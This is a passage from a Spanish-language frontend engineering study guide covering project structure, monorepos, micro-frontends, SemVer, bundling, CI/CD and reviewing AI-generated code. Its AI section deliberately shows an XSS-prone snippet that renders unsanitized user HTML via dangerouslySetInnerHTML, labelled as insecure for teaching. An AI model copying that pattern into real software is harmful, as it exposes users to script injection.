      (`Button/`, `Modal/`) — correcto, porque el producto *es* el
      catálogo de componentes.

  - **Buenas prácticas**:
    - Preferir **feature-based (o híbrido)** en apps de producto; reservar
      type-based puro para libs UI y prototipos.
    - Cada feature expone un **`index.ts` (barrel)** con su API pública;
      el resto de la app no importa paths profundos de otra feature
      (`features/checkout/internal/...`).
    - **Prohibido** (o al menos code-review smell): que `features/a`
      importe internos de `features/b`. Si hay acoplamiento, subir lo
      compartido a `shared/` o crear una feature/módulo de dominio
      común explícito.
    - Colocar **tests junto al código** de la feature (o
      `__tests__` dentro), no un `tests/` global gigante por tipo.
    - Nombrar features por **lenguaje de negocio** (`checkout`,
      `billing`), no por tecnología (`redux-stuff`, `hooks-new`).
    - Empezar type-based y “ya migraremos” suele no migrarse: si
      sospechas crecimiento, crea `features/` desde el día 1 aunque solo
      haya dos.
    - En Next: `app/` = routing/composition; `features/` = dominio;
      `shared/ui` = primitives o re-exports del design system.

  - **Recomendación** (para casi cualquier SPA/app React-Next que
    aspira a senior/escala):
    1. **Default: híbrido** — `features/*` por dominio + `shared/*`
       type-based para UI transversal, utils y clients HTTP.
    2. **Type-based puro** solo si el repo es una **librería de
       componentes**, un spike de un fin de semana, o un script sin
       dominio real.
    3. Si entras a un legacy type-based grande: no reescribas todo;
       **extrae features al tocarlas** (strangler): cada PR que toque
       checkout mueve sus archivos a `features/checkout/`.

    En una frase de entrevista: *“Type-based optimiza encontrar archivos
    por oficio técnico; feature-based optimiza el radio de cambio del
    negocio. En producto a escala elijo feature-based con un `shared`
    deliberadamente pequeño.”*

### En profundidad

- Monorepos con Turborepo/Nx: qué problemas resuelven

  - **Teoría**: un **monorepo** es un solo repositorio Git que contiene
    **varias apps y/o paquetes** relacionados (p. ej. `apps/web`,
    `apps/admin`, `packages/ui`, `packages/config`). Lo opuesto es
    **polyrepo**: un repo por app/paquete.

    El monorepo **no** es “meter todo el código de la empresa en un
    zip”. Es una estrategia de **límites de paquete + tooling** para
    compartir código con el mismo commit message, el mismo PR y un grafo
    de dependencias explícito. Sin tooling, a escala duele; con
    Turborepo/Nx, el dolor se vuelve gestionable.

    **Problemas que aparecen sin orquestador** (yarn/npm workspaces
    solos no bastan cuando crece):

    1. **Builds/tests lentos e ingenuos** — un cambio en `apps/web`
       dispara `build` de *todo* el repo en CI, aunque `packages/ui` no
       haya cambiado.
    2. **Grafo implícito** — “¿quién importa `@miorg/ui`?” solo se
       descubre cuando algo rompe en cadena; no hay tarea “build solo lo
       afectado y sus dependientes”.
    3. **Caché inexistente o local** — el mismo `tsc`/`vite build` se
       recalcula en cada máquina y en cada job de CI.
    4. **DX inconsistente** — cada app tiene su script `lint`/`test` con
       flags distintos; onboarding = arqueología de `package.json`.
    5. (A escala enterprise) **Boundaries rotos** — cualquier app puede
       importar internos de otra; el monorepo se convierte en un
       monolito con carpetas, no en paquetes con contrato.

    **Qué resuelven Turborepo y Nx** (la capa de *task runner* /
    monorepo toolkit encima de workspaces):

    | Capacidad | Para qué sirve |
    |---|---|
    | **Task graph** | Sabes que `build` de `web` depende de `build` de `ui` (`^build`). |
    | **Affected / filtrado** | Solo corres tasks de lo que cambió (+ dependientes). |
    | **Remote cache** | CI (y el equipo) reutilizan artefactos si inputs no cambiaron. |
    | **Pipelines declarativas** | Un `turbo run build lint test` ordena y paraleliza. |
    | **Convenciones** (más Nx) | Generators, tags, module boundaries, plugins por stack. |

    **Turborepo vs Nx** (ambos demandados; eligen distinto trade-off):

    | | **Turborepo** (Vercel) | **Nx** (Nrwl) |
    |---|---|---|
    | Enfoque | Ligero: cache + pipeline sobre workspaces que ya tienes | Platform: generators, graph UI, boundaries, plugins |
    | Curva | Baja: `turbo.json` + scripts npm | Más alta: `project.json` / inferred + Nx Cloud opcional |
    | Encaja bien | JS/TS, Next, “ya tengo apps/ + packages/” | Monorepos grandes, varios stacks, reglas estrictas entre libs |
    | Demanda | Muy alta en startups / Next / Vercel ecosystem | Muy alta en enterprise / Angular históricamente, también React a escala |
    | Remote cache | Vercel Remote Cache / Turborepo | Nx Cloud / self-host |

    Regla mental: **Turborepo = “haz mis scripts más listos y cacheables”**;
    **Nx = “gobierna el monorepo como producto de ingeniería”**.

    **Cuándo sí monorepo + Turborepo/Nx**:
    - 2+ apps que comparten design system, tipos de API o config ESLint/TS.
    - Quieres un PR que cambie `Button` y vea el impacto en `web` + `admin`.
    - CI tarda demasiado porque reconstruye de más.

    **Cuándo no** (o aún no):
    - Una sola app sin paquetes internos reales → monorepo es teatro.
    - Equipos / ciclos de release totalmente ajenos con zero código
      compartido → polyrepo suele ser más simple.
    - Micro-frontends desplegados por equipos que *no* quieren acoplar
      el ciclo de Git (ahí el problema es otro; ver el siguiente
      epígrafe).

  - **Ejemplo** (layout típico + Turborepo):
    ```
    repo/
      apps/
        web/          # Next — depende de @miorg/ui
        admin/        # Vite — depende de @miorg/ui
      packages/
        ui/           # design system
        tsconfig/     # configs compartidas
      turbo.json
      package.json    # workspaces: ["apps/*", "packages/*"]
    ```
    ```json
    // turbo.json — pipeline: build de dependencias internas primero;
    // outputs definen qué se cachea
    {
      "tasks": {
        "build": {
          "dependsOn": ["^build"],
          "outputs": ["dist/**", ".next/**"]
        },
        "lint": {},
        "test": { "dependsOn": ["build"] }
      }
    }
    ```
    ```bash
    # Cambia solo apps/web → Turborepo/Nx puede saltarse rebuild de ui
    # si su hash de inputs (sources + deps) no cambió
    turbo run build --filter=web...
    # "web..." = web + todo lo que web necesita en el grafo

    # Nx equivalente conceptual
    nx run-many -t build --projects=web
    nx affected -t test   # solo proyectos tocados por el diff
    ```

  - **Buenas prácticas**:
    - Empieza con **workspaces nativos** (npm/pnpm/yarn) + un
      orquestador; no inventes paths mágicos sin `package.json` por
      paquete.
    - Un paquete = **un contrato público** (`exports` / `main`) — las
      apps no importan `packages/ui/src/internal/...`.
    - Declara **outputs** de cache bien (`dist/**`, `.next/**`); si
      olvidas outputs, la cache “acierta” pero no restaura artefactos
      útiles.
    - En CI: **remote cache** + `affected`/`--filter` para no pagar el
      monorepo completo en cada PR.
    - Preferir **pnpm** workspaces en monorepos JS (hoisting
      controlado, disco); es lo más citado junto a Turborepo/Nx hoy.
    - Versionar paquetes internos: o bien “siempre latest en el mismo
      commit” (monorepo clásico), o SemVer + changesets si publicas a
      registry (ver epígrafe de SemVer más abajo).
    - Nx: usa **tags** + module boundary rules (`scope:orders` no
      importa `scope:admin-internal`) para que el grafo no se pudra.
    - Turborepo: mantén scripts **iguales por nombre** (`build`,
      `lint`, `test`) en cada `package.json` para que el pipeline sea
      uniforme.

  - **Recomendación**:
    - **Default moderno React/Next con 2+ apps o un DS interno** →
      monorepo `apps/` + `packages/` + **Turborepo** (menos ceremonia).
    - **Org grande, muchas libs, boundaries rígidos, varios frameworks**
      → **Nx** (o Turborepo + disciplina manual fuerte; Nx te la cobra
      en setup y te la ahorra en gobernanza).
    - No elijas monorepo “porque está de moda”: elígelo cuando el costo
      de *sincronizar* código compartido entre repos ya te duele más que
      el costo de aprender el task graph.

- Micro-frontends y module federation: cuándo (no) usarlos

  - **Teoría**: un **micro-frontend (MFE)** parte una UI grande en
    **fragmentos con ciclo de vida propio**: otro equipo (a menudo otro
    repo), otro pipeline y, sobre todo, otro **deploy independiente**.
    El usuario sigue viendo “una sola app”; por detrás son varias apps
    compostas en runtime (o, menos habitual, en build).

    No confundir con cosas parecidas:

    | Concepto | Qué es | ¿Deploy independiente? |
    |---|---|---|
    | **Monorepo** (`apps/web` + `packages/ui`) | Varios paquetes, release Git coordinado | No (salvo que montes deploys separados a propósito) |
    | **Code splitting** (`React.lazy`) | Trozos de *la misma* app/bundle | No |
    | **Micro-frontends** | Varias apps compostas | **Sí** — esa es la razón de existir |
    | **Design system como lib** | UI compartida versionada | El DS sí; la app host no hace falta |

    El problema que resuelven es **organizacional**, no de moda técnica:
    el release monolítico del frontend se vuelve cuello de botella y el
    equipo de Checkout no puede esperar al de Catalog cada viernes.

    **Module Federation** (Webpack 5; también **Rspack**, y plugins
    análogos en Vite) es *una* técnica para lograrlo — la más citada en
    React/Webpack enterprise. Permite que en **runtime** una app
    (**host**/shell) haga `import('checkout/CheckoutApp')` y cargue JS
    ya compilado y **desplegado** por otra app (**remote**), vía un
    `remoteEntry.js`. Piezas clave:
    - **Host**: layout, router, auth, composición.
    - **Remote**: feature con deploy propio (checkout, seller…).
    - **Shared**: dependencias acordadas (`react`, `react-dom`) para no
      montar dos React en la misma página (`singleton: true`).

    Otras formas de MFE (válidas en entrevista): iframes (máximo
    aislamiento, peor UX), Web Components como borde entre frameworks,
    composición en build/CI (menos independencia real), o composición
    por ruta en el edge/CDN.

    **Cuándo sí** (varias a la vez, no solo una):
    1. Varios equipos (≥3–4) dueños de dominios claros.
    2. Necesidad real de deploy independiente (cadencias/ownership
       distintos).
    3. El monolito frontend ya duele: colas de merge, regresiones
       cruzadas, “release train” eterno.
    4. Hay platform team (o equivalente) para shared: versión de React,
       auth, design system, observabilidad.

    **Cuándo no** (lo más importante a nivel senior):
    - 1–2 equipos y un solo producto → suele bastar monorepo +
      features + Turborepo/Nx.
    - El dolor es solo “compartir un Button” → design system / paquete,
      no MFE.
    - Adoptarlo “porque suena moderno” añade version skew entre host y
      remotes, pelea por `shared`, depuración multi-deploy y contratos
      runtime frágiles. Es **YAGNI** resolver un problema de
      coordinación de equipos que aún no existe.

  - **Ejemplo** (host + remote con Module Federation):
    ```js
    // Host — webpack.config.js
    new ModuleFederationPlugin({
      name: 'shell',
      remotes: {
        checkout: 'checkout@https://checkout.miapp.com/remoteEntry.js',
      },
      shared: {
        react: { singleton: true, requiredVersion: '^18.2.0' },
        'react-dom': { singleton: true, requiredVersion: '^18.2.0' },
      },
    });

    // En el host: parece un import local; en runtime viene de otro deploy
    const CheckoutApp = React.lazy(() => import('checkout/CheckoutApp'));
    ```
    ```js
    // Remote — checkout (otro pipeline, otra URL)
    new ModuleFederationPlugin({
      name: 'checkout',
      filename: 'remoteEntry.js',
      exposes: {
        './CheckoutApp': './src/CheckoutApp',
      },
      shared: {
        react: { singleton: true, requiredVersion: '^18.2.0' },
        'react-dom': { singleton: true, requiredVersion: '^18.2.0' },
      },
    });
    ```
    Paso a paso: el shell pinta layout → al entrar a `/checkout` pide el
    `remoteEntry` → resuelve `CheckoutApp` → si `shared` cuadra,
    reutiliza el React del host.

  - **Buenas prácticas**:
    - Contrato explícito del remote (exports estables + tipos); semver o
      “compatible con shell ≥ x”.
    - `react` / `react-dom` en **singleton** y majors alineados.
    - Un design system compartido (lib o remote estable) — no cinco
      botones distintos por equipo.
    - Error boundary + fallback si el remote no carga (deploy a medias).
    - Observabilidad etiquetada por remote (`remote=checkout` en RUM/logs).
    - Empezar con **pocos** remotes (2–3); no un micro por pantalla.

  - **Recomendación** (frase de entrevista): micro-frontends resuelven
    **independencia de deploy entre equipos**; Module Federation es el
    mecanismo runtime más común en el ecosistema Webpack/Rspack. Si el
    dolor es compartir UI o acelerar CI, usa **monorepo + paquetes**;
    reserva MFE para cuando el release monolítico ya es el cuello de
    botella organizacional.

- Versionado semántico de librerías internas compartidas

  - **Teoría**: cuando un design system o una librería de utilidades se
    comparte entre varios equipos/apps dentro de la organización,
    necesita las mismas garantías que cualquier paquete público de npm:
    **SemVer** (versionado semántico, `MAJOR.MINOR.PATCH`) comunica el
    impacto de cada cambio — `PATCH` para bugfixes sin romper nada,
    `MINOR` para funcionalidad nueva compatible hacia atrás, `MAJOR` para
    cambios que rompen el contrato existente (renombrar una prop, quitar
    un componente). Sin esta disciplina, un equipo que actualiza el
    design system no puede saber, sin leer el código fuente, si esa
    actualización es segura o va a romper su app.
  - **Ejemplo** (partiendo de `@miorg/design-system@2.4.1`):

    **PATCH** `2.4.1 → 2.4.2` — bugfix, mismo contrato. Los consumidores
    no cambian código.
    ```tsx
    // Antes (bug): el Button ignoraba disabled en variant="primary"
    // Después: se respeta disabled; la API sigue igual
    <Button variant="primary" disabled>Guardar</Button>
    // package.json del DS: "version": "2.4.2"
    // CHANGELOG: v2.4.2 -- fix: Button respeta disabled en variant primary
    ```

    **MINOR** `2.4.2 → 2.5.0` — feature nueva **compatible**. El código
    viejo sigue compilando; lo nuevo es opt-in.
    ```tsx
    // Se añade variant="ghost" sin quitar primary | secondary
    <Button variant="primary">Guardar</Button>   // sigue válido
    <Button variant="ghost">Cancelar</Button>    // nuevo
    // package.json del DS: "version": "2.5.0"
    // CHANGELOG: v2.5.0 -- feat: Button.variant acepta "ghost"
    ```

    **MAJOR** `2.5.0 → 3.0.0` — breaking change. Hay que migrar.
    ```tsx
    // Antes (v2):  <Button variant="primary" />
    // Después: se renombra la prop → rompe a quien use variant
    <Button type="primary" />
    // package.json del DS: "version": "3.0.0"
    // CHANGELOG: v3.0.0 -- BREAKING: Button.variant renombrado a Button.type
    ```

    Regla práctica al actualizar en la app consumidora:
    - `^2.4.1` en semver de npm acepta `2.4.2` y `2.5.0`, **no** `3.0.0`.
    - Por eso el MAJOR obliga a un bump consciente (y a leer el CHANGELOG).

## 13. Build tools y tooling moderno

### Básico

- Qué hace un bundler, en tres pasos

  - **Teoría**: un bundler resuelve tres problemas distintos, aunque a
    menudo se piensen como uno solo:

    ```
    src/**/*.tsx  ──(1) graph + bundle──►  módulos unidos en chunks
                  ──(2) transpile───────►  JS que el target entiende
                  ──(3) minify──────────►  menos bytes (prod)
    ```

    1. **Bundling**: parte de uno o pocos **entry points**, sigue los
       `import`/`export`, arma el **grafo de módulos** y emite un número
       pequeño de archivos finales (**chunks**). Servir cientos de
       archivos fuente sueltos por HTTP en producción es peor para caché
       y latencia que unos pocos chunks bien partidos.
    2. **Transpiling**: convierte TS/JSX/sintaxis moderna a JS que el
       navegador target entiende (esbuild, SWC, Babel por debajo).
    3. **Minification**: quita espacios, acorta nombres y elimina código
       muerto alcanzable (tree-shaking), sin cambiar el comportamiento.

    **¿Un bundle general o un archivo por componente?** Ni lo uno ni lo
    otro de forma absoluta. En el disco de fuente sí hay muchos
    archivos; en **producción** el bundler **no** publica un `.js` por
    cada componente. Publica **chunks** según el grafo:

    - **Import estático** (`import { Home } from './pages/Home'`) → ese
      módulo entra en el chunk de quien lo importa (a menudo el chunk
      inicial). Sin code splitting, Home + Checkout + Settings pueden
      acabar en un solo `index-*.js` grande: quien visita Home también
      **descarga** Checkout.
    - **`import()` dinámico** / `React.lazy` → **punto de corte**: el
      bundler emite un chunk aparte y el navegador lo pide al navegar a
      esa ruta. Es el modelo habitual en apps con varias rutas.
    - **Código compartido** (`Button` usado por varias rutas) → suele ir
      a un **shared chunk** (o quedar dentro de un vendor), no
      duplicarse en cada ruta.
    - **`node_modules`** (React, etc.) → a menudo un **vendor chunk**
      con hash estable para cachear largo tiempo.

    Matiz importante: en **desarrollo con Vite** el modelo es casi “un
    módulo = una petición ESM” (el navegador pide cada archivo). Eso
    **no** es lo que sale a producción: Vite usa Rollup y sí empaqueta
    en chunks (ver el siguiente epígrafe).

  - **Ejemplo** (app con varias rutas y un componente compartido):
    ```
    src/
      main.tsx              ← entry
      App.tsx
      components/Button.tsx ← compartido
      pages/Home.tsx
      pages/Checkout.tsx
      pages/Settings.tsx
    ```

    Sin code splitting (todo estático) → casi toda la app en el chunk
    inicial:
    ```tsx
    // App.tsx — malo a escala: el usuario de Home baja también Checkout
    import { Home } from './pages/Home';
    import { Checkout } from './pages/Checkout';
    import { Settings } from './pages/Settings';
    ```
    ```
    dist/assets/index-abc123.js   ← Home + Checkout + Settings + Button
    ```

    Con code splitting por ruta (lo habitual):
    ```tsx
    // App.tsx — cada lazy() es un punto de corte para el bundler
    import { lazy, Suspense } from 'react';

    const Home = lazy(() => import('./pages/Home'));
    const Checkout = lazy(() => import('./pages/Checkout'));
    const Settings = lazy(() => import('./pages/Settings'));
    ```
    Grafo conceptual:
    ```
    main.tsx
      └─ App.tsx
           ├─ (estático) Layout, Router     → chunk inicial
           ├─ import() Home                → chunk Home
           │    └─ Button                  → shared (si también lo usa Checkout)
           ├─ import() Checkout            → chunk Checkout
           └─ import() Settings            → chunk Settings
    ```
    Salida típica en `dist/`:
    ```
    dist/assets/
      index-aaa.js       ← entry: main, router, shell
      Home-bbb.js
      Checkout-ccc.js
      Settings-ddd.js
      Button-eee.js      ← o un shared-*.js si el bundler agrupa comunes
      vendor-fff.js      ← react, react-dom (cache largo)
    ```
    Al abrir `/checkout`: (1) el HTML carga `index-aaa.js`; (2) el
    router hace match; (3) el `import()` dispara la descarga de
    `Checkout-ccc.js` (+ shared/vendor si hacen falta).

    Los tres pasos sobre un módulo concreto:
    ```tsx
    // pages/Checkout.tsx (fuente)
    import { Button } from '../components/Button';

    export function Checkout() {
      const total: number = 10;
      return <Button onClick={() => alert(total)}>Pagar</Button>;
    }
    ```
    1. **Bundle** — Checkout + su grafo entran en `Checkout-*.js` (Button
       puede ir a shared).
    2. **Transpile** — JSX → runtime; desaparece la anotación `: number`.
    3. **Minify** — nombres cortos, sin espacios → un `.js` denso.

    Frase de entrevista: *el bundler construye un grafo desde el entry y
    emite chunks; sin lazy routes sueles tener un bundle grande; con
    `import()` dinámico obtienes chunks por ruta (o por punto de corte)
    más chunks compartidos para código común.*

- Vite vs Webpack: por qué Vite es más rápido en desarrollo

  - **Teoría**: Webpack, en desarrollo, hace lo mismo que en producción —
    construye un bundle completo antes de poder servir la primera
    página, y cada cambio de código exige reconstruir (aunque sea de
    forma incremental) ese bundle. Vite explota que los navegadores
    modernos soportan **ESM** nativamente (ya visto en la sección 2): en
    desarrollo, **no empaqueta nada** — sirve cada módulo tal cual, y es
    el propio navegador quien resuelve los `import` haciendo peticiones
    HTTP individuales bajo demanda (rápidas gracias al multiplexado de
    HTTP/2, visto en la sección 1). Esto significa que el servidor de
    desarrollo arranca casi instantáneamente sin importar el tamaño del
    proyecto, y un cambio en un archivo solo recompila **ese** archivo,
    no el proyecto entero. Para producción, Vite sí empaqueta (usando
    Rollup por debajo), porque ahí sí importa minimizar el número de
    peticiones HTTP.
  - **Ejemplo**: la diferencia se siente directamente al iniciar el
    servidor de desarrollo en un proyecto grande:
    ```bash
    # Webpack: debe construir el bundle completo antes de servir algo
    # (segundos a minutos, según el tamaño del proyecto)
    webpack serve

    # Vite: sirve los módulos sin empaquetar, el navegador los pide vía ESM
    # (arranque casi instantáneo, independiente del tamaño del proyecto)
    vite dev
    ```

### En profundidad

- Tree-shaking en profundidad y el flag `sideEffects`

  - **Teoría**: el tree-shaking (mencionado ya en la sección 2 al hablar
    de ESM) depende de que el bundler pueda probar, con certeza
    estática, que eliminar un export no cambia el comportamiento del
    programa. El problema: un módulo puede tener **side effects** en su
    nivel superior (registrar un polyfill, modificar un objeto global)
    que ocurren solo por **importar** el archivo, sin usar ningún export
    específico — el bundler, por seguridad, no puede eliminar ese código
    aunque nada lo referencie explícitamente, a menos que se le diga
    explícitamente que es seguro hacerlo. El campo `"sideEffects"` en
    `package.json` es esa declaración: le dice al bundler "ningún
    archivo de este paquete tiene efectos secundarios a nivel de módulo,
    puedes eliminar con confianza lo que no se use". Un paquete que omite
    esta declaración (o la pone mal) impide el tree-shaking completo de
    sus consumidores, aunque tanto el paquete como el proyecto que lo usa
    estén en ESM puro.
  - **Ejemplo**:
    ```js
    // utils.js -- un archivo con un side effect a nivel de módulo
    window.miLibreria = { version: '1.0' }; // ocurre solo con importar el archivo
    export function sumar(a, b) { return a + b; }
    ```
    ```json
    // Sin esto, el bundler asume que TODOS los archivos podrían tener
    // side effects como el de arriba, y no puede eliminar nada con seguridad
    { "sideEffects": false }

    // Declaración más fina: solo estos archivos tienen side effects,
    // el resto del paquete es seguro de tree-shakear
    { "sideEffects": ["./src/polyfills.js"] }
    ```

- Code splitting a nivel de bundler: chunks automáticos vs manuales

  - **Teoría**: más allá del `import()` dinámico manual (ya visto en
    `GOOD-FRONTEND-PRACTICES.md`), los bundlers modernos hacen **chunk
    splitting automático**: detectan qué dependencias se comparten entre
    varias rutas/páginas y las agrupan en un chunk común, en vez de
    duplicar esa misma dependencia dentro de cada chunk de ruta. El
    **splitting manual** (`manualChunks` en Rollup/Vite) le da control
    explícito al desarrollador cuando la heurística automática no es
    óptima — por ejemplo, para forzar que una librería pesada y
    rara vez actualizada (React mismo) quede en su propio chunk,
    separado del código de la app que cambia constantemente, así el
    navegador puede cachear ese chunk de librería por mucho más tiempo
    sin invalidarlo en cada deploy.
  - **Ejemplo**:
    ```ts
    // vite.config.ts
    export default {
      build: {
        rollupOptions: {
          output: {
            manualChunks: {
              // React casi nunca cambia entre deploys: aislarlo en su propio
              // chunk permite que el navegador lo cachee por mucho más tiempo
              vendor: ['react', 'react-dom'],
            },
          },
        },
      },
    };
    ```

- Análisis de bundle: qué buscar en `vite-bundle-visualizer`

  - **Teoría**: sin visibilidad real de qué compone el bundle final, es
    fácil que una dependencia pesada se cuele sin que nadie lo note (una
    librería completa de íconos importada entera para usar un solo
    ícono, una librería de fechas con soporte para todos los locales del
    mundo cuando solo se necesita uno). Estas herramientas generan un
    **treemap** visual donde el tamaño de cada rectángulo es
    proporcional al peso real de ese módulo en el bundle final,
    facilitando detectar de un vistazo cuál es el mayor contribuyente al
    peso total.
  - **Ejemplo**:
    ```bash
    npx vite-bundle-visualizer
    # Abre un treemap interactivo: rectángulos grandes = módulos pesados
    ```
    Señales típicas al leer el resultado: un rectángulo enorme llamado
    `moment.js` cuando el proyecto solo formatea dos fechas (candidato a
    reemplazar por `date-fns`, que sí es tree-shakeable); o una misma
    librería apareciendo **duplicada** dos veces con versiones distintas
    (señal de que dos dependencias directas fijaron versiones
    incompatibles entre sí de una tercera dependencia común).

## 14. CI/CD, despliegue y observabilidad

Esto amplía la sección 8 de `GOOD-FRONTEND-PRACTICES.md` (monitoreo de
errores) con el resto del ciclo de vida de un cambio: cómo llega a
producción y cómo se sabe que sigue funcionando ahí.

### Básico

- Qué es un pipeline CI/CD y sus etapas típicas para frontend

  - **Teoría**: **CI** (ya definido en el Glosario de
    `GOOD-FRONTEND-PRACTICES.md`) automatiza validar cada cambio; **CD**
    (*Continuous Delivery/Deployment* — ver Glosario) automatiza
    **llevarlo** a producción de forma segura una vez validado. Un
    pipeline de frontend típico encadena etapas donde cada una debe pasar
    para continuar a la siguiente: si el lint falla, ni siquiera se
    ejecutan los tests — se falla rápido, ahorrando tiempo de cómputo y
    dando feedback antes.
  - **Ejemplo**:
    ```yaml
    # .github/workflows/ci.yml (simplificado)
    jobs:
      ci:
        steps:
          - run: npm ci
          - run: npm run lint       # falla rápido si el estilo/reglas no pasan
          - run: npm run typecheck  # errores de tipos antes de gastar tiempo en tests
          - run: npm test           # tests unitarios y de integración
          - run: npm run build      # confirma que el build de producción compila
          - run: npm run deploy     # solo si todo lo anterior pasó
    ```

### En profundidad

- Feature flags y despliegues progresivos

  - **Teoría**: desplegar una feature nueva al 100% de los usuarios de
    una sola vez maximiza el **blast radius** (el alcance del daño) si
    tiene un bug no detectado en testing. Un **feature flag** permite
    activar código nuevo en producción sin necesariamente exponerlo a
    todos: se puede habilitar solo para el equipo interno, para un
    porcentaje pequeño de usuarios reales (**canary release**), y
    ampliarlo gradualmente si las métricas se mantienen sanas. **Blue-green
    deployment** es una técnica complementaria a nivel de infraestructura:
    mantener dos entornos idénticos ("blue" en producción actual, "green"
    con la versión nueva), enrutar tráfico al nuevo solo cuando está
    verificado, y poder revertir el tráfico al entorno anterior
    instantáneamente si algo sale mal, sin necesitar un nuevo deploy.
  - **Ejemplo**:
    ```tsx
    function CheckoutPage() {
      const nuevoFlujoHabilitado = useFeatureFlag('nuevo-checkout-v2');
      // Sin necesidad de un deploy nuevo para revertir: basta con apagar
      // el flag remotamente si el nuevo flujo muestra errores en producción
      return nuevoFlujoHabilitado ? <CheckoutV2 /> : <CheckoutV1 />;
    }
    ```
    Con un canary release, `useFeatureFlag` podría estar configurado para
    devolver `true` solo para el 5% de los usuarios inicialmente, y
    ampliarse a 25%, 50%, 100% conforme se confirma que no introdujo
    regresiones.

- RUM vs synthetic monitoring: por qué se complementan

  - **Teoría**: **RUM** (ya definido en el Glosario de
    `GOOD-FRONTEND-PRACTICES.md`) mide el rendimiento real que
    experimentan usuarios reales, en sus dispositivos y redes reales —
    pero solo detecta un problema **después** de que ya afectó a alguien.
    El *synthetic monitoring* (monitoreo sintético) ejecuta chequeos
    automatizados y programados desde un entorno controlado (Lighthouse
    CI, un bot que visita la página cada 10 minutos desde distintas
    ubicaciones), sin depender de tráfico real — detecta una regresión
    de forma proactiva, incluso a las 3am cuando casi no hay usuarios
    reales navegando para que RUM la capture. Ninguno reemplaza al otro:
    RUM da la verdad de campo, sintético da alertas tempranas y
    consistentes.
  - **Ejemplo**:
    ```ts
    // RUM: mide en el navegador real de cada visitante y envía a un backend propio
    import { onLCP, onINP, onCLS } from 'web-vitals';
    onLCP((metric) => enviarAMonitoreo('LCP', metric.value, navigator.userAgent));
    ```
    ```yaml
    # Synthetic: corre cada hora desde un entorno controlado, sin depender de tráfico real
    - schedule: '0 * * * *'
      run: lighthouse-ci https://miapp.com --assert-lcp=2500
    ```

- Estrategias de rollback rápido

  - **Teoría**: cuando un despliegue introduce un bug crítico en
    producción, la prioridad inmediata es **detener el sangrado**, no
    diagnosticar la causa raíz — eso viene después, con calma. Un
    rollback rápido revierte al último estado conocido como bueno.
    Combinado con feature flags, muchos rollbacks ni siquiera necesitan
    un nuevo deploy: si el bug está detrás de un flag, apagarlo
    revierte el comportamiento al instante; si el bug está en el código
    base general, el pipeline de CD debe permitir re-desplegar la
    versión anterior con un solo comando, sin tener que reconstruir
    manualmente un commit viejo bajo presión.
  - **Ejemplo**:
    ```bash
    # Rollback casi instantáneo: apunta el tráfico a la versión anterior
    # ya construida y verificada, sin reconstruir nada
    vercel rollback --to=deployment-anterior-verificado

    # O, si el bug está detrás de un feature flag, ni siquiera se necesita
    # un rollback de infraestructura: basta con apagar el flag remotamente
    ```

## 15. IA aplicada al desarrollo frontend

### Básico

- Autocompletado asistido por IA vs un agente que ejecuta tareas completas

  - **Teoría**: son dos niveles de autonomía muy distintos, aunque ambos
    se apoyen en un **LLM** (*Large Language Model* — ver Glosario). El
    autocompletado **inline** (tipo GitHub Copilot) sugiere la siguiente
    línea o bloque de código mientras escribes, dentro del archivo que
    ya tienes abierto — el desarrollador revisa cada sugerencia en el
    momento, prácticamente carácter por carácter, antes de aceptarla. Un
    **agente** (tipo Claude Code) recibe un objetivo de más alto nivel
    ("agrega validación al formulario de login") y decide por sí mismo
    qué archivos leer, qué cambios hacer en cuántos archivos, y puede
    ejecutar comandos (tests, builds) sin supervisión línea por línea.
    Mayor autonomía significa mayor productividad potencial, pero también
    mayor riesgo si el resultado no se revisa con el mismo estándar que
    cualquier otro cambio de código.
  - **Ejemplo**: la diferencia práctica en el flujo de trabajo:
    ```
    Autocompletado inline: escribes "function calcularDescuento(" y la
    IA sugiere el cuerpo de la función; tú decides aceptar (Tab) o
    ignorar esa sugerencia puntual, una línea a la vez.

    Agente: le pides "agrega un test para calcularDescuento cubriendo el
    caso de precio negativo" y el agente decide solo en qué archivo va el
    test, qué herramienta de testing usar (detectándola del proyecto), y
    corre el test para confirmar que pasa -- sin que reveses cada paso
    intermedio en tiempo real.
    ```

### En profundidad

- Por qué y cómo verificar código generado por IA antes de aceptarlo

  - **Teoría**: código generado por **IA** (Inteligencia Artificial — ver
    Glosario) puede ser sintácticamente correcto y "verse bien" sin ser
    correcto en su lógica de negocio o sus casos límite — el modelo
    genera texto estadísticamente plausible, no garantiza corrección. El
    estándar de revisión de código generado por IA debe ser **el mismo**
    (o más estricto, mientras se genera confianza en el patrón) que el
    de código escrito por una persona: leerlo línea por línea, correr los
    tests, verificar los casos límite, nunca aceptarlo "porque compiló" o
    "porque se ve razonable".
  - **Ejemplo**: un caso típico donde "se ve bien" no es suficiente:
    ```ts
    // Código sugerido por IA: se ve razonable a primera vista
    function calcularDescuento(precio: number, porcentaje: number) {
      return precio - precio * (porcentaje / 100);
    }

    // Al revisarlo con atención (o con un test), aparece el caso límite
    // que la sugerencia no contempló:
    calcularDescuento(100, -50); // devuelve 150 -- un "descuento" negativo sube el precio
    calcularDescuento(100, 150); // devuelve -50 -- un precio negativo no tiene sentido
    // Ambos casos necesitan validación explícita que el modelo no agregó por sí solo
    ```

- Riesgos conocidos: alucinación de APIs y código inseguro con buena sintaxis

  - **Teoría**: dos riesgos concretos y documentados de aceptar código de
    IA sin verificar. La **alucinación** ocurre cuando el modelo genera
    con total confianza el nombre de un paquete, una función o un
    parámetro que **no existe** — es sintácticamente indistinguible de
    una llamada real hasta que se ejecuta (o hasta que TypeScript/el
    linter la marcan, si existen). El segundo riesgo es más sutil: código
    con **sintaxis impecable** pero que introduce una vulnerabilidad de
    seguridad conocida (por ejemplo, insertar HTML de usuario sin
    sanitizar, ya visto en `GOOD-FRONTEND-PRACTICES.md`) porque el modelo
    reprodujo un patrón común en su entrenamiento sin aplicar el
    contexto de seguridad específico de este proyecto.
  - **Ejemplo**:
    ```ts
    // Alucinación: este método no existe en la API real de axios,
    // el modelo lo generó por similitud con otras librerías
    axios.getWithRetry('/api/data'); // TypeError en runtime: no es una función real

    // Sintaxis correcta, pero inseguro: reproduce un patrón común sin
    // aplicar la sanitización que el proyecto ya exige en otros lugares
    <div dangerouslySetInnerHTML={{ __html: comentarioDelUsuario }} />
    // Un revisor humano (o un linter de seguridad) debe detectar que
    // falta DOMPurify.sanitize(), tal como se exige en el resto del código
    ```

- Cómo dar contexto efectivo a un asistente de código

  - **Teoría**: la calidad de lo que un asistente de IA genera depende
    directamente de cuánto contexto real del proyecto recibe. Un prompt
    vago ("agrega un botón") fuerza al modelo a adivinar convenciones —
    qué librería de estilos usa el proyecto, cómo se nombran los
